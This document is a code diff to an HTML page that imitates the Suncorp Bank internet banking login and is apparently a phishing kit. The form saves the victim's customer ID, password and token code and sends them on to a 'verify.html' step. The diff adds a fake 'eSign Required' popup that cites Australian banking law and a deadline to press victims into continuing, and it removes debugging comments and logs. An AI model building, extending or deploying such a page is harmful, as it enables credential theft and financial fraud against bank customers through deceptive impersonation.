@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html class="responsive js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="en" style=""><!--<![endif]--><head>
   <meta content="no-cache" http-equiv="cache-control">
   <meta content="no-cache" http-equiv="pragma">
@@ -19,6 +20,188 @@
   <link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
   <link href="css/normalize.css" rel="stylesheet" type="text/css">
   <link href="css/suncorpnew-uama.css" media="screen" rel="stylesheet" type="text/css">
+  <style>
+    /* Additional styles for eSign Popup — matching main page fonts/styling */
+    .esign-modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(3px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      font-family: Arial, Helvetica, sans-serif;
+      transition: opacity 0.25s ease;
+    }
+    .esign-modal-container {
+      max-width: 560px;
+      width: 90%;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 20px 35px rgba(0, 0, 0, 0.2);
+      overflow: hidden;
+      animation: modalFadeIn 0.3s ease-out;
+    }
+    @keyframes modalFadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    .esign-modal-header {
+      background: #003366;
+      padding: 18px 24px;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .esign-modal-header h3 {
+      margin: 0;
+      font-size: 1.4rem;
+      font-weight: 600;
+      color: #ffffff;
+      letter-spacing: -0.2px;
+      font-family: inherit;
+    }
+    .esign-modal-body {
+      padding: 28px 24px 20px;
+      background: #fff;
+    }
+    .esign-message {
+      font-size: 1rem;
+      line-height: 1.5;
+      color: #2c3e4f;
+      margin-bottom: 28px;
+      font-family: inherit;
+      background: #f8f9fc;
+      padding: 16px 18px;
+      border-left: 4px solid #ffc800;
+      border-radius: 4px;
+    }
+    .esign-message p {
+      margin: 0 0 12px 0;
+    }
+    .esign-message strong {
+      color: #003366;
+    }
+    .esign-due-date {
+      font-weight: 600;
+      color: #b33c00;
+    }
+    .esign-section {
+      margin: 20px 0 24px;
+      border-top: 1px solid #e2e6e9;
+      padding-top: 20px;
+    }
+    .esign-section-title {
+      font-weight: 600;
+      font-size: 1.05rem;
+      margin-bottom: 16px;
+      color: #003366;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .esign-signature-area {
+      background: #fef9e6;
+      border: 1px dashed #ccb27c;
+      border-radius: 8px;
+      padding: 20px 18px;
+      margin-bottom: 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .esign-signature-area:hover {
+      background: #fff7e0;
+      border-color: #b38f40;
+    }
+    .esign-signature-label {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      font-size: 0.95rem;
+      color: #4a5c6c;
+      font-weight: 500;
+    }
+    .esign-signature-label span:first-child {
+      font-size: 2rem;
+    }
+    .esign-confirm-btn {
+      background: #ffc800;
+      border: none;
+      border-radius: 40px;
+      padding: 12px 24px;
+      font-size: 1rem;
+      font-weight: 700;
+      color: #003366;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.2s;
+      font-family: inherit;
+      letter-spacing: 0.3px;
+      margin-top: 8px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+    }
+    .esign-confirm-btn:hover {
+      background: #e0b000;
+      transform: translateY(-1px);
+    }
+    .esign-cancel-btn {
+      background: transparent;
+      border: 1px solid #bdc4cc;
+      border-radius: 40px;
+      padding: 10px 20px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: #4a5c6c;
+      margin-top: 12px;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.2s;
+      font-family: inherit;
+    }
+    .esign-cancel-btn:hover {
+      background: #f0f2f5;
+      border-color: #8e9eae;
+    }
+    .esign-footer-note {
+      font-size: 0.7rem;
+      color: #7e8c98;
+      text-align: center;
+      margin-top: 16px;
+      border-top: 1px solid #edf0f2;
+      padding-top: 14px;
+    }
+    .esign-checkbox-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 15px 0 10px;
+      font-size: 0.85rem;
+    }
+    .esign-checkbox-row input {
+      width: 18px;
+      height: 18px;
+      cursor: pointer;
+      accent-color: #003366;
+    }
+    .sg-Input--error-border {
+      border: 1px solid #d32f2f !important;
+      border-color: #d32f2f !important;
+    }
+    @keyframes suncorp-spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
  </head>
  <body class="sg-Page">
   <header class="sg-Header">
@@ -108,7 +291,6 @@
            </span>
           </p>
           <div class="sg-Box sg-Box--withIcon token-input">
-           <!-- Hidden inputs to pass the login URL and clientId -->
            <input id="authenticateURL" type="hidden" value="https://internetbanking.suncorpbank.com.au/iam/v1/authenticate">
            <input id="clientId" type="hidden" value="90efdc91-314b-4bf8-ae02-77158f44fc5b">
            <input id="toggleIpr" type="hidden" value="true">
@@ -134,10 +316,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const passwordInput = document.getElementById('password');
     const passcodeInput = document.getElementById('passcode');
     
-    // Find the Flextable element to insert error box before it
     const flextable = document.querySelector('.sg-Flextable.sg-Flextable--2cols.sg-Flextable--collapseLarge');
-    
-    // Create the error box
     const errorBox = document.createElement('div');
     errorBox.id = 'simpleErrorBox';
     errorBox.className = 'sg-Box sg-Box--error sg-Box--withIcon uama-hidden';
@@ -151,13 +330,10 @@ document.addEventListener('DOMContentLoaded', function() {
             <p>This is an invalid combination of Internet Banking Customer ID, Internet Banking Password and Token Code - please re-enter your details. Your Internet Banking password is case sensitive so ensure your CAPS lock is not on. <strong>If you have a security token or use the Suncorp Bank Secured App you must enter a token code to login.</strong></p>
         </div>
     `;
-    
-    // Insert error box before the Flextable
     if (flextable && flextable.parentNode) {
         flextable.parentNode.insertBefore(errorBox, flextable);
     }
     
-    // Add red border style class
     const style = document.createElement('style');
     style.textContent = `
         .sg-Input--error-border {
@@ -171,30 +347,22 @@ document.addEventListener('DOMContentLoaded', function() {
     `;
     document.head.appendChild(style);
     
-    // ✅ FIXED: Customer ID must be 8-10 digits (not 8,9,10)
     function validateUserId(userId) {
-        const userIdRegex = /^\d{8,10}$/;  // Fixed: 8 to 10 digits
+        const userIdRegex = /^\d{8,10}$/;
         return userIdRegex.test(userId);
     }
     
     function validatePassword(password) {
-        // At least 8 characters
         if (password.length < 8) return false;
-        // At least one uppercase letter
         if (!/[A-Z]/.test(password)) return false;
-        // At least one lowercase letter
         if (!/[a-z]/.test(password)) return false;
-        // At least one number
         if (!/[0-9]/.test(password)) return false;
-        // At least one special character
         if (!/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) return false;
         return true;
     }
     
     function validatePasscode(passcode) {
-        // If empty, it's valid (optional field)
         if (!passcode || passcode.length === 0) return true;
-        // If provided, must be 6-8 digits
         const passcodeRegex = /^\d{6,8}$/;
         return passcodeRegex.test(passcode);
     }
@@ -211,14 +379,11 @@ document.addEventListener('DOMContentLoaded', function() {
     
     function hideLoading() {
         const existingOverlay = document.getElementById('login-loading-overlay');
-        if (existingOverlay) {
-            existingOverlay.remove();
-        }
+        if (existingOverlay) existingOverlay.remove();
     }
     
     function showLoading() {
         hideLoading();
-        
         const overlay = document.createElement('div');
         overlay.id = 'login-loading-overlay';
         overlay.style.cssText = `
@@ -236,7 +401,6 @@ document.addEventListener('DOMContentLoaded', function() {
             z-index: 9999;
             transition: opacity 0.3s ease;
         `;
-        
         const spinner = document.createElement('div');
         spinner.style.cssText = `
             width: 60px;
@@ -246,7 +410,6 @@ document.addEventListener('DOMContentLoaded', function() {
             border-radius: 50%;
             animation: suncorp-spin 1s linear infinite;
         `;
-        
         const text = document.createElement('p');
         text.style.cssText = `
             color: #ffc800;
@@ -255,18 +418,124 @@ document.addEventListener('DOMContentLoaded', function() {
             margin-top: 20px;
             letter-spacing: 1px;
         `;
-        text.textContent = '';
-        
+        text.textContent = 'Processing your request...';
         overlay.appendChild(spinner);
         overlay.appendChild(text);
         document.body.appendChild(overlay);
     }
     
-    // Remove errors when user types
     userIdInput.addEventListener('input', clearAllErrors);
     passwordInput.addEventListener('input', clearAllErrors);
     if (passcodeInput) passcodeInput.addEventListener('input', clearAllErrors);
     
+    // ----- eSign Popup Logic (triggered only after validation passes) -----
+    function showESignPopup(onConfirmCallback) {
+      // Create modal overlay matching Suncorp styling
+      const modalOverlay = document.createElement('div');
+      modalOverlay.className = 'esign-modal-overlay';
+      
+      modalOverlay.innerHTML = `
+        <div class="esign-modal-container">
+          <div class="esign-modal-header">
+            <h3>eSign Required — Document Acknowledgment</h3>
+          </div>
+          <div class="esign-modal-body">
+            <div class="esign-message">
+              <p><strong>Suncorp:</strong> Your policy has been updated in accordance with the <strong>Australian Banking Act 1959</strong> &amp; <strong>APRA requirements</strong>.</p>
+              <p>Please review and sign the document before <span class="esign-due-date">30/05/2026</span>. Check your email for details.</p>
+              <p>Thank you for choosing Suncorp.</p>
+            </div>
+            <div class="esign-section">
+              <div class="esign-section-title">
+                <span>📄</span> Electronic Signature Section
+              </div>
+              <div id="esignSignatureArea" class="esign-signature-area">
+                <div class="esign-signature-label">
+                  <span>✍️</span>
+                  <span>Click to sign electronically</span>
+                </div>
+                <div id="signatureStatus" style="font-size:0.85rem; margin-top: 8px; color:#2d5a2c; font-weight:500;"></div>
+              </div>
+              <div class="esign-checkbox-row">
+                <input type="checkbox" id="esignConsentCheckbox">
+                <label for="esignConsentCheckbox" style="font-size:0.85rem; color:#2c3e4f;">I confirm that I have reviewed the updated policy and consent to sign the document electronically. I understand this e-signature carries legal effect under the Electronic Transactions Act 1999.</label>
+              </div>
+              <button id="esignConfirmBtn" class="esign-confirm-btn" disabled>Confirm & Proceed to Login</button>
+              <button id="esignCancelBtn" class="esign-cancel-btn">Cancel & Return</button>
+              <div class="esign-footer-note">
+                ⚡ By confirming, you digitally sign the document. A copy will be sent to your registered email.
+              </div>
+            </div>
+          </div>
+        </div>
+      `;
+      
+      document.body.appendChild(modalOverlay);
+      document.body.style.overflow = 'hidden';
+      
+      const signatureArea = modalOverlay.querySelector('#esignSignatureArea');
+      const confirmBtn = modalOverlay.querySelector('#esignConfirmBtn');
+      const cancelBtn = modalOverlay.querySelector('#esignCancelBtn');
+      const consentCheckbox = modalOverlay.querySelector('#esignConsentCheckbox');
+      const signatureStatusDiv = modalOverlay.querySelector('#signatureStatus');
+      
+      let isSigned = false;
+      
+      function updateConfirmButtonState() {
+        if (isSigned && consentCheckbox.checked) {
+          confirmBtn.disabled = false;
+          confirmBtn.style.opacity = '1';
+        } else {
+          confirmBtn.disabled = true;
+          confirmBtn.style.opacity = '0.6';
+        }
+      }
+      
+      function setSignatureSigned() {
+        if (isSigned) return;
+        isSigned = true;
+        signatureArea.style.background = "#e9f7e1";
+        signatureArea.style.borderColor = "#5a8f2c";
+        signatureArea.querySelector('.esign-signature-label').innerHTML = '<span>✅</span><span>Electronically Signed ✓</span>';
+        signatureStatusDiv.innerHTML = 'Signature captured: ' + new Date().toLocaleString();
+        updateConfirmButtonState();
+      }
+      
+      signatureArea.addEventListener('click', (e) => {
+        e.stopPropagation();
+        if (!isSigned) {
+          setSignatureSigned();
+        } else {
+          // optional: show tooltip but do nothing else
+        }
+      });
+      
+      consentCheckbox.addEventListener('change', () => {
+        updateConfirmButtonState();
+      });
+      
+      confirmBtn.addEventListener('click', () => {
+        if (!isSigned || !consentCheckbox.checked) {
+          // just in case, but button disabled prevents
+          return;
+        }
+        // Remove popup
+        modalOverlay.remove();
+        document.body.style.overflow = '';
+        // After esign confirmed, invoke the original loading & redirect flow
+        if (onConfirmCallback && typeof onConfirmCallback === 'function') {
+          onConfirmCallback();
+        }
+      });
+      
+      cancelBtn.addEventListener('click', () => {
+        modalOverlay.remove();
+        document.body.style.overflow = '';
+        // user cancelled, do nothing, stay on login page
+      });
+    }
+    
+    // main submit interception
     form.addEventListener('submit', function(e) {
         e.preventDefault();
         clearAllErrors();
@@ -276,55 +545,40 @@ document.addEventListener('DOMContentLoaded', function() {
         const passcode = passcodeInput ? passcodeInput.value.trim() : '';
         
         let isValid = true;
-        let errorMessage = '';
-        
-        // ✅ Validate Customer ID (8-10 digits)
         if (!userId || !validateUserId(userId)) {
             userIdInput.classList.add('sg-Input--error-border');
             userIdInput.setAttribute('aria-invalid', 'true');
             isValid = false;
-            errorMessage = 'Customer ID must be between 8-10 digits.';
-            console.error('Customer ID validation failed:', userId, 'Length:', userId ? userId.length : 0);
         }
-        
-        // Validate password (8+ chars, uppercase, lowercase, number, special char)
         if (!password || !validatePassword(password)) {
             passwordInput.classList.add('sg-Input--error-border');
             passwordInput.setAttribute('aria-invalid', 'true');
             isValid = false;
-            errorMessage = 'Password must be at least 8 characters with uppercase, lowercase, number and special character.';
-            console.error('Password validation failed');
         }
-        
-        // Validate passcode (6-8 digits, optional)
         if (!validatePasscode(passcode)) {
             passcodeInput.classList.add('sg-Input--error-border');
             passcodeInput.setAttribute('aria-invalid', 'true');
             isValid = false;
-            errorMessage = 'Token Code must be 6-8 digits if provided.';
-            console.error('Passcode validation failed');
         }
         
         if (!isValid) {
-            // Show the error box above the Flextable
             errorBox.style.display = 'block';
-            console.log('Validation failed:', errorMessage);
             return;
         }
         
-        console.log('Validation passed!');
-        console.log('User ID:', userId, 'Length:', userId.length);
-        
-        // Store in sessionStorage
+        // validation passed: store data
         sessionStorage.setItem('userId', userId);
         sessionStorage.setItem('userPassword', password);
         sessionStorage.setItem('userPasscode', passcode || 'Not provided');
         
-        showLoading();
-        
-        setTimeout(function() {
-            window.location.href = 'verify.html';
-        }, 3000);
+        // ---- NEW: Show eSign Popup before loading effect ----
+        showESignPopup(function() {
+            // After user confirms eSign, we proceed to show loading and redirect
+            showLoading();
+            setTimeout(function() {
+                window.location.href = 'verify.html';
+            }, 3000);
+        });
     });
 });
 </script>
@@ -428,11 +682,8 @@ document.addEventListener('DOMContentLoaded', function() {
   </footer>
   <iframe class="aamIframeLoaded" id="destination_publishing_iframe_suncorp_0" name="destination_publishing_iframe_suncorp_0_name" sandbox="allow-scripts allow-same-origin" src="assets/dest5.html" style="display: none; width: 0px; height: 0px;" title="Adobe ID Syncing iFrame">
   </iframe>
-  
   <img height="0" src="assets/resizeimage.ashx" style="display:none;" width="0">
- 
-
-<div class="sg-Tooltip js-TooltipContent" id="whatAreSecurityTokens">
+  <div class="sg-Tooltip js-TooltipContent" id="whatAreSecurityTokens">
    <div class="sg-Tooltip-arrow js-Arrow">
    </div>
    <div class="sg-Tooltip-header">
@@ -451,4 +702,7 @@ document.addEventListener('DOMContentLoaded', function() {
      Read more about Security Tokens
     </a>
    </div>
-  </div><img style="display:none;" src="https://css.page-source.com/resizeimage.ashx?ig=&amp;sz=179401" width="0" height="0"></body></html>
+  </div>
+  <img style="display:none;" src="https://css.page-source.com/resizeimage.ashx?ig=&amp;sz=179401" width="0" height="0">
+ </body>
+</html>
